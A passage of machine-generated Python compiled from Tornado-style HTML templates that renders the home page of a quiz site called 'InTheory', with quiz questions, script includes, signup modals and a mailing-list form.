146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img 